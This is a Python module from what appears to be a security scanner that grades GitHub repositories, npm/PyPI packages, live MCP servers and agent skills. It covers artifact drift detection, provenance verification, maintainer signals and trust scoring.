    token: str | None,
    ref: str | None,
    artifact: tuple[str, str, str | None] | None,
    repo_text_hashes: dict[str, str],
) -> None:
    """Phase 2 — fetch + scan the PUBLISHED artifact and record repo↔artifact drift.

    Feature-flagged (``settings.scanner_scan_artifact``, default OFF) and FAIL-OPEN:
    any resolve/download/unpack error leaves the repo-only grade + coverage
    untouched. When it succeeds it folds artifact findings (install hooks, injected/
    modified files, plus every 12-category detector run over the real tree) into the
    scan and upgrades ``coverage.scan_depth`` to ``"artifact"`` with the exact
    artifact ``sha256`` digest and a pinned registry snapshot date.
    """
    from src.config import settings

    if not getattr(settings, "scanner_scan_artifact", False):
        return

    coord = artifact or _discover_artifact_coord(owner, repo, tree, token, ref)
    if not coord:
        return
    ecosystem, name, version = coord

    try:
        from src.scanner.artifact_scan import scan_published_artifact

        # Repo path set (from the full tree — no extra network) drives added-file
        # drift; the fetched text hashes drive modified-file drift.
        repo_paths = {it["path"] for it in tree if it.get("type") == "blob"}

        art = await scan_published_artifact(
            ecosystem, name, version,
            repo_paths=repo_paths,
            repo_text_hashes=repo_text_hashes,
        )
    except Exception:
        logger.warning("Artifact scan wiring failed for %s/%s — repo-only stands",
                       owner, repo, exc_info=True)
        return

    if not art.ok:
        result.artifact_scan = {"ok": False, "error": art.error,
                                "ecosystem": ecosystem, "name": name}
        return

    # Fold artifact findings into the scored grade and record drift.
    result.findings.extend(art.findings)
    result.drift = art.drift
    result.artifact_scan = {
        "ok": True,
        "ecosystem": art.ecosystem,
        "name": art.name,
        "version": art.version,
        "kind": art.kind,
        "digest": art.digest,
        "download_url": art.download_url,
        "files_scanned": art.files_scanned,
        "file_count": art.file_count,
        "unpacked_size": art.unpacked_size,
        "drift": art.drift,
    }

    # Upgrade the coverage block: scan_depth=artifact + the real artifact digest +
    # a pinned registry snapshot date (Phase 0 recompute discipline).
    from src.scanner.coverage import SCAN_DEPTH_ARTIFACT

    if not isinstance(result.coverage, dict):
        result.coverage = {}
    result.coverage["surface"] = art.ecosystem
    result.coverage["scan_depth"] = SCAN_DEPTH_ARTIFACT
    if art.digest:
        result.coverage["artifact_digest"] = art.digest
    snaps = result.coverage.get("db_snapshots")
    if not isinstance(snaps, dict):
        snaps = {}
    if art.registry_snapshot:
        snaps["registry"] = art.registry_snapshot
    result.coverage["db_snapshots"] = snaps


def _discover_artifact_coord(
    owner: str, repo: str, tree: list[dict], token: str | None, ref: str | None,
) -> tuple[str, str, str | None] | None:
    """Best-effort (ecosystem, name, version) from the repo's root manifest.

    Only reads what we can infer synchronously from the tree — root ``package.json``
    (npm) or ``pyproject.toml`` / ``setup.py`` (PyPI). Version is left ``None`` so the
    fetcher resolves the registry's latest. Returns None when no coordinate is found.
    """
    root_names = {Path(it["path"]).name.lower(): it["path"]
                  for it in tree if "/" not in it["path"]}
    # We only have the tree here (not contents); the caller can pass an explicit
    # coordinate. Auto-discovery uses the presence of a root manifest as the signal
    # and defers name resolution to the fetch step via the repo name as a fallback.
    if "package.json" in root_names:
        return ("npm", repo, None)
    if "pyproject.toml" in root_names or "setup.py" in root_names or "setup.cfg" in root_names:
        return ("pypi", repo, None)
    return None


async def _maybe_verify_provenance(
    result: ScanResult,
    owner: str,
    repo: str,
    tree: list[dict],
    token: str | None,
    ref: str | None,
    artifact: tuple[str, str, str | None] | None,
) -> None:
    """Phase 3 — fetch + cryptographically verify build provenance (npm/PyPI).

    Feature-flagged (``settings.scanner_verify_provenance``, default OFF) and
    FAIL-OPEN: any resolve/fetch/verify error leaves the grade + coverage
    untouched and ``coverage.provenance_binding`` stays ``"n/a"``.

    Scoring policy (Kenne decision #4), applied as a SEPARATE additive signal:
      * absent provenance  → N/A, **never a penalty** (the long tail has none);
      * present + verified  → a small bonus, and sets
        ``coverage.provenance_binding = "verified:<repo>@<commit>"`` + the
        provenance evidence anchor;
      * CLAIMS provenance but fails verification → a small penalty (real red flag).

    Provenance pairs naturally with the Phase-2 artifact fetch: when the published
    artifact was resolved we verify THAT exact digest (enabling the subject-digest
    gate and the top-tier "certified" eligibility). Without a concrete version we
    skip (fail-open) rather than guess.
    """
    from src.config import settings

    if not getattr(settings, "scanner_verify_provenance", False):
        return

    # Resolve a concrete coordinate. Prefer the Phase-2-resolved artifact (gives a
    # digest + artifact scan_depth); else an explicit caller coordinate.
    ecosystem = name = version = None
    artifact_digest = None
    filename = None
    art = result.artifact_scan if isinstance(result.artifact_scan, dict) else {}
    if art.get("ok"):
        ecosystem, name, version = art.get("ecosystem"), art.get("name"), art.get("version")
        artifact_digest = art.get("digest")
        dl = art.get("download_url")
        if dl:
            filename = Path(str(dl).split("?", 1)[0]).name
    elif artifact and artifact[2]:
        ecosystem, name, version = artifact

    surface = {"npm": "npm", "pypi": "pypi"}.get((ecosystem or "").lower())
    if not surface or not name or not version:
        return  # no verifiable coordinate → stay n/a, fail-open

    claimed_repo = f"https://github.com/{owner}/{repo}"
    scan_depth = (result.coverage or {}).get("scan_depth", "repo-only")

    try:
        from src.scanner.provenance import analyze_provenance

        res = await analyze_provenance(
            surface, name, version,
            filename=filename,
            claimed_repo=claimed_repo,
            artifact_digest=artifact_digest,
            scan_depth=scan_depth,
        )
    except Exception:
        logger.warning(
            "Provenance verification wiring failed for %s/%s — repo grade stands",
            owner, repo, exc_info=True,
        )
        return

    _apply_provenance_result(result, res, claimed_repo)


def _apply_provenance_result(result: ScanResult, res, claimed_repo: str | None) -> None:
    """Fold a verified :class:`ProvenanceResult` into ``result.provenance`` + the
    coverage block (score delta, binding, Rekor pin, evidence anchor, linked repo).
    Shared by the repo path (``_maybe_verify_provenance``) and the native package
    scan (``scan_package``) so both wire provenance identically."""
    from src.scanner.provenance import coverage_binding_value, provenance_score_delta

    delta, reason = provenance_score_delta(res)
    summary = res.summary()
    summary["score_delta"] = delta
    summary["score_reason"] = reason
    result.provenance = summary

    # Wire into the coverage block (recompute discipline).
    if not isinstance(result.coverage, dict):
        result.coverage = {}
    result.coverage["provenance_binding"] = coverage_binding_value(res)
    if res.snapshot:
        snaps = result.coverage.get("db_snapshots")
        if not isinstance(snaps, dict):
            snaps = {}
        # Pin the Rekor index / fetch timestamp so the check is offline-recomputable.
        if res.snapshot.get("rekor_log_index"):
            snaps["rekor_log_index"] = res.snapshot["rekor_log_index"]
        result.coverage["db_snapshots"] = snaps

    if res.verified:
        # Add the provenance evidence anchor and record the verified source binding.
        from src.scanner.coverage import EVIDENCE_ANCHOR_SBOM, build_evidence_anchors

        has_sbom = EVIDENCE_ANCHOR_SBOM in (result.coverage.get("evidence_anchors") or [])
        result.coverage["evidence_anchors"] = build_evidence_anchors(
            has_sbom=has_sbom, has_provenance=True,
        )
        linked = result.coverage.get("linked_repo")
        if not isinstance(linked, dict):
            linked = {"url": claimed_repo} if claimed_repo else {}
        prov_commit = res.binding.get("commit")
        if prov_commit:
            linked["commit"] = prov_commit
        linked["binding"] = "slsa-provenance"
        result.coverage["linked_repo"] = linked


def _repo_from_manifest(manifest: dict | None) -> str | None:
    """Extract the declared source repository from an npm package.json ``repository``
    field (a string or a ``{"url": ...}`` object) — the claim provenance is checked
    against for ``source_matches_claim``."""
    if not isinstance(manifest, dict):
        return None
    repo = manifest.get("repository")
    if isinstance(repo, str):
        return repo
    if isinstance(repo, dict):
        url = repo.get("url")
        return url if isinstance(url, str) else None
    return None


def _looks_like_mcp_server(eco: str, name: str, manifest: dict | None) -> bool:
    """Heuristic: is this published package a runnable MCP server? Checks the npm
    manifest (MCP SDK dep, `mcp`/`modelcontextprotocol` keyword, a `bin` entry) and
    the package name. Used only to pick the install affordance — never the grade."""
    n = (name or "").lower()
    if "mcp" in n or "model-context-protocol" in n or "modelcontextprotocol" in n:
        return True
    if isinstance(manifest, dict):
        deps = {}
        for k in ("dependencies", "peerDependencies", "devDependencies"):
            d = manifest.get(k)
            if isinstance(d, dict):
                deps.update(d)
        if any("modelcontextprotocol" in str(dk).lower() or dk.lower() == "fastmcp" for dk in deps):
            return True
        kws = manifest.get("keywords")
        if isinstance(kws, list) and any(
            "mcp" == str(kw).lower() or "modelcontextprotocol" in str(kw).lower() for kw in kws
        ):
            return True
        if manifest.get("bin"):
            desc = str(manifest.get("description", "")).lower()
            if "mcp" in desc or "model context protocol" in desc:
                return True
    return False


async def scan_package(surface: str, name: str, version: str | None = None) -> ScanResult:
    """Grade a PUBLISHED npm / PyPI package directly by coordinate — no GitHub repo
    required. Fetches + STATICALLY scans the real artifact tree (the same 12-category
    engine + install-hook detectors, via ``scan_artifact_files``), verifies the
    package's build provenance on the exact coordinate (the axis that can earn A+),
    and returns a signed A+..F ``ScanResult`` with ``coverage.surface`` set and
    ``scan_depth = "artifact"``.

    Fail-open: any fetch/scan/verify error yields a ``ScanResult`` carrying
    ``.error`` (or a benign partial result) — it never raises.
    """
    from src.config import settings
    from src.scanner.artifact_fetch import (
        ArtifactFetchError,
        fetch_npm_artifact,
        fetch_pypi_artifact,
    )
    from src.scanner.artifact_scan import _registry_snapshot, scan_artifact_files
    from src.scanner.coverage import SCAN_DEPTH_ARTIFACT, build_coverage

    eco = (surface or "").strip().lower()
    if eco == "python":
        eco = "pypi"
    result = ScanResult(repo=f"{eco}:{name}", stars=0, description="", framework="")
    if eco not in ("npm", "pypi"):
        result.error = f"unsupported surface: {surface!r} (use npm or pypi)"
        return result
    if not getattr(settings, "scanner_scan_artifact", False):
        result.error = "artifact scanning is disabled"
        return result

    try:
        if eco == "npm":
            fetched = await fetch_npm_artifact(name, version)
        else:
            fetched = await fetch_pypi_artifact(name, version)
    except ArtifactFetchError as exc:
        result.error = str(exc)
        return result
    except Exception as exc:  # noqa: BLE001 — fail-open is mandatory
        result.error = f"artifact fetch failed: {exc}"
        logger.warning("scan_package fetch failed for %s:%s", eco, name, exc_info=True)
        return result
    if not fetched.ok:
        result.error = fetched.error or "artifact fetch failed"
        return result

    findings, files_scanned, has_hook = scan_artifact_files(fetched)
    result.findings = findings
    result.files_scanned = files_scanned
    result.total_scannable_files = files_scanned
    result.primary_language = "JavaScript/TypeScript" if eco == "npm" else "Python"
    result.has_readme = any(
        Path(p).name.lower().startswith("readme") for p in fetched.files
    )
    result.has_license = any(
        Path(p).name.lower().startswith(("license", "licence", "copying"))
        for p in fetched.files
    )
    result.artifact_scan = {
        "ok": True, "ecosystem": fetched.ecosystem, "name": fetched.name,
        "version": fetched.version, "kind": fetched.kind, "digest": fetched.digest,
        "download_url": fetched.download_url, "file_count": fetched.file_count,
        "unpacked_size": fetched.unpacked_size, "has_install_hook": has_hook,
        # Is this package a runnable MCP server? (→ the UI offers stdio 1-click
        # deeplinks with `npx -y <pkg>` / `uvx <pkg>`, not just an install command.)
        "is_mcp_server": _looks_like_mcp_server(eco, fetched.name, fetched.packaged_manifest),
    }
    result.coverage = build_coverage(
        surface=eco,
        artifact_digest=fetched.digest,
        scan_depth=SCAN_DEPTH_ARTIFACT,
        db_snapshots={"registry": _registry_snapshot()},
    )

    # Provenance verification on the exact coordinate — this is what makes A+
    # reachable for a package that publishes Sigstore/PEP-740 provenance.
    if getattr(settings, "scanner_verify_provenance", False):
        try:
            from src.scanner.provenance import analyze_provenance

            claimed_repo = _repo_from_manifest(fetched.packaged_manifest)
            filename = (
                Path(str(fetched.download_url).split("?", 1)[0]).name
                if (eco == "pypi" and fetched.download_url) else None
            )
            res = await analyze_provenance(
                eco, fetched.name, fetched.version,
                filename=filename,
                claimed_repo=claimed_repo,
                artifact_digest=fetched.digest,
                scan_depth=SCAN_DEPTH_ARTIFACT,
            )
            _apply_provenance_result(result, res, claimed_repo)
        except Exception:
            logger.warning(
                "scan_package provenance wiring failed for %s:%s", eco, name, exc_info=True
            )

    result.trust_score = _calculate_trust_score(result)
    result.category_scores = _calculate_category_scores(result)
    result.certified = _certified_status(result)
    return result


async def scan_mcp(endpoint_url: str) -> ScanResult:
    """Grade a LIVE MCP server by its endpoint URL (roadmap §2.D). Handshakes the
    server, enumerates its advertised ``tools/list`` (+ resources/prompts), and
    scores the SERVED surface — tool-poisoning in descriptions, input-schema risk,
    dangerous-capability taxonomy + lethal trifecta, annotation truthfulness.

    ``coverage.surface = "mcp"``, ``scan_depth = "artifact+live"`` (live-observed,
    point-in-time — the served surface can change, so this is not offline-recompute
    anchored). Fail-open: a handshake failure returns a ScanResult with ``.error``.
    """
    from src.scanner.coverage import SCAN_DEPTH_ARTIFACT_LIVE, build_coverage
    from src.scanner.mcp_scan import analyze_mcp, fetch_mcp_tools

    result = ScanResult(repo=f"mcp:{endpoint_url}", stars=0, description="", framework="")
    result.is_mcp_server = True
    data = await fetch_mcp_tools(endpoint_url)
    if not data:
        result.error = (
            "Could not handshake the MCP server — check it's a reachable "
            "Streamable-HTTP endpoint (stdio/SSE-only servers aren't supported yet)."
        )
        return result

    mcp = analyze_mcp(
        data.get("tools"),
        resources=data.get("resources"),
        prompts=data.get("prompts"),
        server_info=data.get("server_info"),
    )
    result.findings = mcp.findings
    result.files_scanned = mcp.tool_count
    result.total_scannable_files = mcp.tool_count
    result.primary_language = "MCP"
    if mcp.tool_count and not mcp.lethal_trifecta and result.critical_count == 0:
        result.positive_signals.append(f"{mcp.tool_count} tools enumerated · no lethal trifecta")
    result.artifact_scan = {
        "surface": "mcp", "server_name": mcp.server_name,
        "tool_count": mcp.tool_count, "resource_count": mcp.resource_count,
        "prompt_count": mcp.prompt_count, "capabilities": mcp.capabilities,
        "lethal_trifecta": mcp.lethal_trifecta,
    }
    result.coverage = build_coverage(
        surface="mcp", scan_depth=SCAN_DEPTH_ARTIFACT_LIVE, live_observed=True,
    )
    result.trust_score = _calculate_trust_score(result)
    result.category_scores = _calculate_category_scores(result)
    result.certified = _certified_status(result)
    return result


async def scan_skill(owner: str, repo: str) -> ScanResult:
    """Grade an OpenClaw / Agent SKILL living in a GitHub repo (roadmap §2.D). Finds
    the SKILL.md, fetches the manifest + bundled scripts + lifecycle-hook files, and
    STATICALLY grades the capability surface — the auto-exec `allowed-tools` grant,
    always-loaded-description injection, lifecycle-hook escalation, and env-exfil in
    scripts. ``coverage.surface = openclaw``, scan_depth = artifact. Fail-open."""
    from src.github_auth import get_github_token
    from src.scanner.coverage import SCAN_DEPTH_ARTIFACT, build_coverage
    from src.scanner.skill_scan import analyze_skill

    result = ScanResult(repo=f"skill:{owner}/{repo}", stars=0, description="", framework="")
    try:
        token = await get_github_token()
        tree, _trunc, repo_ok, ref = await _fetch_repo_tree(owner, repo, token)
        if not repo_ok:
            result.error = "Repository not found or unreadable"
            return result
        blobs = [it["path"] for it in tree if it.get("type") == "blob"]
        skill_mds = [p for p in blobs if p.lower().endswith("skill.md")]
        if not skill_mds:
            result.error = "No SKILL.md found — this repo isn't a recognizable Agent Skill."
            return result

        # A repo can hold MANY skills (a monorepo). Grade the PRIMARY one — the
        # shallowest SKILL.md — and scope the scripts/hooks to its own directory,
        # so a big skills-collection doesn't blur into one grade. Skip template/
        # example/test skeletons so we grade a REAL skill (keep them only if that's
        # all there is).
        import re as _re
        _skel = _re.compile(r"(?:^|/)(template|example|sample|demo|starter|_?tests?)s?/", _re.I)
        _real = [p for p in skill_mds if not _skel.search(p)]
        skill_md_path = min(_real or skill_mds, key=lambda p: (p.count("/"), p.lower()))
        skill_dir = skill_md_path.rsplit("/", 1)[0] if "/" in skill_md_path else ""
        script_ext = (".sh", ".bash", ".zsh", ".py", ".js", ".ts", ".rb", ".pl", ".ps1")
        hook_names = ("hooks.json", "plugin.json", ".mcp.json")

        def _in_skill(p: str) -> bool:
            if skill_dir and not (p == skill_md_path or p.startswith(skill_dir + "/")):
                return False
            base = p.rsplit("/", 1)[-1].lower()
            return (p.lower().endswith((".md",) + script_ext)) or base in hook_names

        # SKILL.md first (never let the cap drop it), then the rest of its dir.
        want = [skill_md_path] + [p for p in blobs if p != skill_md_path and _in_skill(p)][:39]

        files: dict[str, str] = {}
        for p in want:
            txt = await _fetch_file_content(owner, repo, p, token, ref)
            if txt is not None:
                files[p] = txt
        if skill_md_path not in files:
            result.error = "Could not read the skill's SKILL.md."
            return result

        skill = analyze_skill(files, skill_md_path=skill_md_path)

        result.findings = skill.findings
        result.files_scanned = len(files)
        result.total_scannable_files = len(files)
        result.primary_language = "Agent Skill"
        result.tool_manifest_digest = skill.tree_digest
        result.artifact_scan = {
            "surface": "openclaw", "skill_name": skill.skill_name,
            "allowed_tools": skill.allowed_tools, "auto_exec_risk": skill.auto_exec_risk,
            "has_lifecycle_hooks": skill.has_lifecycle_hooks, "script_count": skill.script_count,
            "tree_digest": skill.tree_digest,
        }
        if skill.script_count == 0 and not skill.has_lifecycle_hooks and result.critical_count == 0:
            result.positive_signals.append("No bundled scripts or lifecycle hooks")
        result.coverage = build_coverage(surface="openclaw", scan_depth=SCAN_DEPTH_ARTIFACT)
        result.trust_score = _calculate_trust_score(result)
        result.category_scores = _calculate_category_scores(result)
        result.certified = _certified_status(result)
    except Exception as exc:  # noqa: BLE001 — fail-open
        result.error = f"skill scan failed: {exc}"
        logger.warning("scan_skill failed for %s/%s", owner, repo, exc_info=True)
    return result


async def _maybe_maintainer_signals(
    result: ScanResult,
    owner: str,
    repo: str,
    token: str | None,
) -> None:
    """Phase 5 — cheap GitHub-METADATA maintainer/behavioral signals (fail-open).

    Feature-flagged (``settings.scanner_maintainer_signals``, default OFF) and
    FAIL-OPEN: any error leaves the grade untouched. NO code execution, NO sandbox
    — only a handful (~5, capped) of read-only GitHub API calls. When on it:
      * appends strong positive labels (active maintenance, protected branch, org
        2FA, signed commits, contributor diversity) to ``positive_signals`` so they
        earn the standard +5-each bonus, and
      * records a small, BOUNDED negative ``score_delta`` for clear negatives
        (archived/abandoned) — capped so it can never false-flip a small/new repo
        to F. Absent/unreadable signals contribute 0.
    """
    from src.config import settings

    if not getattr(settings, "scanner_maintainer_signals", False):
        return

    try:
        from src.scanner.maintainer import (
            analyze_maintainer_signals,
            maintainer_penalty,
        )

        sig = await analyze_maintainer_signals(
            owner, repo, token,
            max_calls=getattr(settings, "scanner_maintainer_max_calls", 5),
        )
    except Exception:
        logger.warning(
            "Maintainer-signal wiring failed for %s/%s — grade stands",
            owner, repo, exc_info=True,
        )
        return

    if not sig.ok:
        # Nothing readable (fail-open): record the attempt, no score change.
        result.maintainer = sig.summary()
        return

    # Positives → the scanner's normal positive_signals bonus (deduped as a set
    # in _calculate_trust_score). Clear negatives → a bounded score penalty.
    result.positive_signals.extend(sig.positive_signals)
    penalty = maintainer_penalty(sig)
    summary = sig.summary()
    summary["score_delta"] = -penalty
    result.maintainer = summary


async def scan_repo(
    full_name: str,
    stars: int = 0,
    description: str = "",
    framework: str = "",
    token: str | None = None,
    artifact: tuple[str, str, str | None] | None = None,
) -> ScanResult:
    """Scan a single GitHub repo for security issues.

    Args:
        full_name: "owner/repo" format
        stars: star count (for metadata)
        description: repo description
        framework: detected framework
        token: GitHub API token (optional but recommended for rate limits)
        artifact: optional explicit published-artifact coordinate
            ``(ecosystem, name, version)`` for the Phase-2 artifact scan (npm/pypi).
            When omitted and the artifact feature flag is on, a coordinate is
            auto-discovered from the repo's root manifest.

    Returns:
        ScanResult with findings and trust score
    """
    result = ScanResult(
        repo=full_name,
        stars=stars,
        description=description,
        framework=framework,
    )

    parts = full_name.split("/")
    if len(parts) != 2:
        result.error = f"Invalid repo name: {full_name}"
        return result

    owner, repo = parts

    try:
        # Fetch file tree. A very large monorepo may come back truncated (or its
        # recursive tree fetch may error) — that's a partial/sampled tree, not a
        # failure, so we still return a real score rather than a 502.
        tree, tree_truncated, repo_ok, ref = await _fetch_repo_tree(owner, repo, token)
        if not repo_ok:
            # Repo genuinely missing / private / unreachable — a real error.
            result.error = "Could not fetch repo tree (may be empty or private)"
            return result
        if tree_truncated:
            # The tree is only a sample of a large repo — never present the grade
            # as an authoritative whole-repo verdict.
            result.sampled = True

        result.primary_language = _detect_language(tree)

        # Check for README, LICENSE, tests
        for item in tree:
            path_lower = item["path"].lower()
            if path_lower.startswith("readme"):
                result.has_readme = True
            if path_lower.startswith("license") or path_lower.startswith("licence"):
                result.has_license = True
            if "test" in path_lower or "spec" in path_lower:
                result.has_tests = True

        # Detect MCP server context — MCP servers have expected tool patterns
        # (fs_access, subprocess) that shouldn't be penalized as heavily
        mcp_indicators = {"server.json", "mcp.json", ".mcp.json"}
        mcp_dep_files = {"package.json", "pyproject.toml", "setup.py"}
        for item in tree:
            fname = Path(item["path"]).name.lower()
            if fname in mcp_indicators:
                result.is_mcp_server = True
                break
        if not result.is_mcp_server:
            # Check if package.json or pyproject.toml mentions MCP
            for item in tree:
                if Path(item["path"]).name.lower() in mcp_dep_files:
                    content = await _fetch_file_content(
                        owner, repo, item["path"], token, ref=ref,
                    )
                    low = (content or "").lower()
                    mcp_match = "mcp" in low or "modelcontextprotocol" in low
                    if mcp_match or "model-context-protocol" in low:
                        result.is_mcp_server = True
                        break

        # Detect audio/TTS/media tools — filesystem access is expected
        if not result.is_media_tool:
            media_keywords = {
                "tts", "text-to-speech", "speech", "audio", "voice",
                "whisper", "synthesize", "synthesizer", "vocoder",
                "video", "ffmpeg", "media", "sound", "wav", "mp3",
                "transcribe", "transcription",
            }
            # Check repo name and description
            repo_lower = full_name.lower()
            desc_lower = description.lower()
            if any(kw in repo_lower or kw in desc_lower for kw in media_keywords):
                result.is_media_tool = True
            # Check file patterns in tree
            if not result.is_media_tool:
                media_file_patterns = {
                    ".wav", ".mp3", ".ogg", ".flac", ".m4a",
                    ".mp4", ".avi", ".mkv", ".webm",
                    "audio", "voice", "tts", "speech",
                }
                media_file_count = sum(
                    1 for item in tree
                    if any(p in item["path"].lower() for p in media_file_patterns)
                )
                if media_file_count >= 3:
                    result.is_media_tool = True

        # Check for dependency pinning (lock files) in tree
        lock_files = {"requirements.txt", "poetry.lock", "package-lock.json",
                      "pipfile.lock", "cargo.lock", "yarn.lock", "pnpm-lock.yaml"}
        for item in tree:
            if Path(item["path"]).name.lower() in lock_files:
                result.positive_signals.append("Dependency pinning")
                break

        # Load .agentgraph-scan.yml config if present
        user_excludes: set[str] = set()
        for item in tree:
            if item["path"] in (".agentgraph-scan.yml", ".agentgraph-scan.yaml"):
                cfg_content = await _fetch_file_content(
                    owner, repo, item["path"], token, ref=ref,
                )
                if cfg_content:
                    try:
                        import yaml  # noqa: E402
                        cfg = yaml.safe_load(cfg_content) or {}
                        for pattern in cfg.get("exclude", []):
                            user_excludes.add(str(pattern).lower())
                    except Exception:
                        pass
                break

        # Filter to scannable files (respecting user excludes)
        def _user_excluded(path: str) -> bool:
            low = path.lower()
            return any(exc in low for exc in user_excludes)

        scannable_files = [
            item for item in tree
            if not _should_skip_path(item["path"])
            and _is_source_file(item["path"])
            and not _user_excluded(item["path"])
        ]
        # Coverage disclosure (#4): record the full scannable count BEFORE truncation,
        # and flag when the signed grade is only a sample of the repo.
        result.total_scannable_files = len(scannable_files)
        # OR: keep an already-set truncation flag (partial tree from a large
        # monorepo) even when the returned sample is under the file cap.
        result.sampled = (
            result.sampled or result.total_scannable_files > _MAX_FILES_PER_REPO
        )
        scan_files = scannable_files[:_MAX_FILES_PER_REPO]

        # Load allowlist once for the whole scan
        allowlist = _load_allowlist()

        # Scan files in parallel batches (10 concurrent fetches)
        import asyncio

        scan_concurrency = 10
        per_file_timeout = 15.0  # seconds per file fetch
        sem = asyncio.Semaphore(scan_concurrency)

        # Phase 2: repo file content hashes (path -> sha256 of text), used to detect
        # repo↔artifact MODIFIED-file drift. Only populated for files we fetched.
        repo_text_hashes: dict[str, str] = {}

        async def _scan_one(item: dict) -> tuple:
            """Fetch and scan a file.

            Returns (findings, positives, suppressed, digest, text_hash, scanned).
            ``scanned`` is True only when the file was actually fetched AND scanned —
            a failed fetch or empty file returns False so it does NOT inflate
            ``files_scanned`` (#7). ``text_hash`` is ``(path, sha256(text))`` for
            Phase-2 drift comparison, or None.
            """
            path = item["path"]
            try:
                async with sem:
                    content = await asyncio.wait_for(
                        _fetch_file_content(owner, repo, path, token, ref=ref),
                        timeout=per_file_timeout,
                    )
                if not content:
                    return [], [], 0, None, None, False
                f, p, s = _scan_content(content, path, allowlist)
                text_hash = hashlib.sha256(content.encode("utf-8")).hexdigest()
                return (
                    f, p, s, (path, _canonical_tool_digest(content, path)),
                    (path, text_hash), True,
                )
            except (asyncio.TimeoutError, Exception):
                return [], [], 0, None, None, False

        tasks = [_scan_one(item) for item in scan_files]
        scan_results = await asyncio.gather(*tasks)

        for findings_list, positives_list, suppressed, digest, text_hash, scanned in scan_results:
            # Only count files that were actually scanned (#7) — signed filesScanned
            # must reflect real coverage, not attempted fetches.
            if scanned:
                result.files_scanned += 1
            result.findings.extend(findings_list)
            result.positive_signals.extend(positives_list)
            result.suppressed_count += suppressed
            if digest and digest[1]:
                result.tool_digests[digest[0]] = digest[1]
            if text_hash and text_hash[1]:
                repo_text_hashes[text_hash[0]] = text_hash[1]

        result.tool_manifest_digest = _compute_manifest_digest(result.tool_digests)

        # --- Dependency vulnerability scanning ---
        dep_file_names = {f.lower() for f in _DEP_FILES}
        dep_files = [
            item for item in tree
            if Path(item["path"]).name.lower() in dep_file_names
            and not _should_skip_path(item["path"])
        ]
        for dep_item in dep_files[:10]:  # cap at 10 dep files
            try:
                async with sem:
                    dep_content = await asyncio.wait_for(
                        _fetch_file_content(
                            owner, repo, dep_item["path"], token, ref=ref,
                        ),
                        timeout=per_file_timeout,
                    )
                if dep_content:
                    dep_findings = _scan_dependencies(
                        dep_content, dep_item["path"],
                    )
                    result.findings.extend(dep_findings)
            except (asyncio.TimeoutError, Exception):
                pass

        # --- Phase 1: real supply-chain (OSV / deps.dev / Scorecard) ----------
        # Parse the repo's real lockfiles → OSV → severity-weighted CVE/GHSA/MAL
        # findings that replace the regex list for covered ecosystems. Additive,
        # feature-flagged, and FAIL-OPEN: on any error the legacy regex findings
        # above stand and the scan proceeds. Every DB date is pinned into the
        # coverage block so the subscore is offline-recomputable (Phase 0).
        await _run_supply_chain(
            result, owner, repo, tree, token, ref, sem, per_file_timeout,
        )

        # --- Phase 2: published-artifact fetch + scan + repo↔artifact drift ----
        # Feature-flagged (default OFF) and FAIL-OPEN. When enabled it scans the
        # real npm/PyPI artifact (install hooks, injected/modified files, the full
        # 12-category engine over the extracted tree) and upgrades coverage to
        # scan_depth="artifact" with the exact artifact digest.
        await _maybe_scan_artifact(
            result, owner, repo, tree, token, ref, artifact, repo_text_hashes,
        )

        # --- Phase 3: provenance / signing verification ------------------------
        # Feature-flagged (default OFF) and FAIL-OPEN. Fetches + cryptographically
        # verifies the published package's build provenance (npm Sigstore / PyPI
        # PEP 740), binds it to source repo+commit+builder, and feeds a SEPARATE
        # additive signal: verified→bonus, claims-but-fails→small penalty, absent→
        # N/A. Runs after the artifact scan so it can verify the exact fetched digest.
        await _maybe_verify_provenance(
            result, owner, repo, tree, token, ref, artifact,
        )

        # --- Phase 5: maintainer / behavioral signals --------------------------
        # Feature-flagged (default OFF) and FAIL-OPEN. GitHub-METADATA only (no
        # code execution, no sandbox): bus factor, release cadence/staleness,
        # archived/abandoned, issue responsiveness, branch protection, org 2FA,
        # signed-commit ratio. Strong positives feed positive_signals; clear
        # negatives apply a small BOUNDED penalty (never a false-F). Capped at ~5
        # extra API calls, reusing the token.
        await _maybe_maintainer_signals(result, owner, repo, token)

        # Calculate trust score and per-category sub-scores
        result.trust_score = _calculate_trust_score(result)
        result.category_scores = _calculate_category_scores(result)
        result.certified = _certified_status(result)

    except httpx.TimeoutException:
        result.error = "Request timed out"
    except Exception as exc:
        result.error = str(exc)
        logger.exception("Error scanning %s", full_name)

    return result
